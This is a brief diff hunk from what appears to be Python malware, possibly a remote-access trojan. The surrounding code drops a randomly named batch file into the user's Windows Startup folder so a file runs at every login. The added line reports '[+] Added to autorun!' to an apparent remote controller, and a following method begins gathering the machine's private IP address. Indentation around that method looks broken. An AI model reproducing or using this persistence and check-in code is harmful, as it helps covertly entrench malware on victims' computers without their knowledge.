@@ -135,6 +135,7 @@ class MainWindow:
         batp = "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + self.random_string() + ".bat"
         with open(batp, "w") as f:
             f.write("start "" \"" + filename + "\"")
+        self.send("[+] Added to autorun!")
 
         def get_privateip(self):
         s = socket(AF_INET, SOCK_DGRAM)
